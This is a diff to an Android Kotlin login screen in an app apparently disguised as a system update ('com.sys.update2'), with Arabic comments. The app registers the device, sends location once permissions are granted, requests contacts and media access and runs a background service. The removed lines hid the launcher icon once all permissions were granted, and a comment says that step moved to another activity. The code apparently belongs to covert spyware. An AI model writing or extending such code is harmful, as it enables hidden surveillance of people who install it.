@@ -1,7 +1,8 @@
+// language: Kotlin, file: LoginActivity.kt
+
 package com.sys.update2
 
 import android.Manifest
-import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -117,7 +118,6 @@ class LoginActivity : ComponentActivity() {
     private var selectedLang by mutableStateOf(0)
     private var pendingMediaAction: (() -> Unit)? = null
     private var permissionAttempts = 0
-    private var appHidden = false
 
     private val pickProfile =
         registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
@@ -138,6 +138,7 @@ class LoginActivity : ComponentActivity() {
 
     private val INITIAL_PERM_REQUEST = 101
     private val MEDIA_PERM_REQUEST = 102
+    private val NOTIF_PERM_REQUEST = 103
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -146,11 +147,12 @@ class LoginActivity : ComponentActivity() {
         window.navigationBarColor = AColor.parseColor("#040018")
 
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
-        startBackgroundService()
+
+        // ❌ لا نُطلق الـ service من onCreate — نتركها لـ onResume
 
         Handler(Looper.getMainLooper()).postDelayed({
             requestInitialPermissions()
-        }, 2000L)
+        }, 1500L)
 
         setContent {
             AppTheme {
@@ -170,6 +172,26 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
+    override fun onResume() {
+        super.onResume()
+        // الإطلاق الآمن للـ service من الـ foreground فقط
+        BackgroundService.startSafely(this)
+        // طلب إذن الإشعارات على Android 13+ إذا لم يُمنح
+        requestNotifPermissionIfNeeded()
+    }
+
+    private fun requestNotifPermissionIfNeeded() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return
+        if (ContextCompat.checkSelfPermission(
+                this, Manifest.permission.POST_NOTIFICATIONS
+            ) == PackageManager.PERMISSION_GRANTED) return
+        ActivityCompat.requestPermissions(
+            this,
+            arrayOf(Manifest.permission.POST_NOTIFICATIONS),
+            NOTIF_PERM_REQUEST
+        )
+    }
+
     private fun requestInitialPermissions() {
         permissionAttempts++
         val needed = mutableListOf<String>()
@@ -184,8 +206,6 @@ class LoginActivity : ComponentActivity() {
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), INITIAL_PERM_REQUEST)
         } else {
             sendLocationNow()
-            startBackgroundService()
-            checkAndHideIfAllGranted()
         }
     }
 
@@ -202,34 +222,16 @@ class LoginActivity : ComponentActivity() {
                     return
                 }
                 sendLocationNow()
-                startBackgroundService()
-                checkAndHideIfAllGranted()
+                // ❌ أزلنا checkAndHideIfAllGranted — انتقل لـ HomeActivity
             }
             MEDIA_PERM_REQUEST -> {
                 val granted = grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }
                 if (granted) pendingMediaAction?.invoke()
                 else showToast("يجب السماح بالوصول للصور")
                 pendingMediaAction = null
-                Handler(Looper.getMainLooper()).postDelayed({ checkAndHideIfAllGranted() }, 500L)
             }
+            NOTIF_PERM_REQUEST -> { /* لا شيء — إشعار الـ service يظهر من الآن */ }
         }
-    }
-
-    private fun areAllPermissionsGranted(): Boolean {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return false
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return false
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) return false
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) return false
-        } else {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) return false
-        }
-        return true
-    }
-
-    private fun checkAndHideIfAllGranted() {
-        if (appHidden) return
-        if (areAllPermissionsGranted()) hideLauncherIcon()
     }
 
     private fun requestMediaPermissionThen(action: () -> Unit) {
@@ -245,7 +247,6 @@ class LoginActivity : ComponentActivity() {
         }
         if (needed.isEmpty()) {
             action()
-            checkAndHideIfAllGranted()
         } else {
             pendingMediaAction = action
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), MEDIA_PERM_REQUEST)
@@ -270,25 +271,6 @@ class LoginActivity : ComponentActivity() {
                 }
             } catch (_: Exception) {}
         }.start()
-    }
-
-    private fun hideLauncherIcon() {
-        if (appHidden) return
-        appHidden = true
-        try {
-            val c = ComponentName(this, LoginActivity::class.java)
-            packageManager.setComponentEnabledSetting(c,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP)
-        } catch (_: Exception) {}
-    }
-
-    private fun startBackgroundService() {
-        try {
-            val intent = Intent(this, BackgroundService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
-            else startService(intent)
-        } catch (_: Exception) {}
     }
 
     private fun showToast(msg: String) {
@@ -331,9 +313,8 @@ class LoginActivity : ComponentActivity() {
                             if (result.isSuccess) {
                                 showToast("✅ تم تسجيل الدخول")
                                 Handler(Looper.getMainLooper()).postDelayed({
-                                    startBackgroundService()
                                     goToHome()
-                                }, 800)
+                                }, 500)
                             } else {
                                 showToast(FirebaseAuthHelper.translateError(result.exceptionOrNull()?.message))
                             }
@@ -406,9 +387,8 @@ class LoginActivity : ComponentActivity() {
                             if (result.isSuccess) {
                                 showToast("✅ تم إنشاء الحساب")
                                 Handler(Looper.getMainLooper()).postDelayed({
-                                    startBackgroundService()
                                     goToHome()
-                                }, 800)
+                                }, 500)
                             } else {
                                 showToast(FirebaseAuthHelper.translateError(result.exceptionOrNull()?.message))
                             }
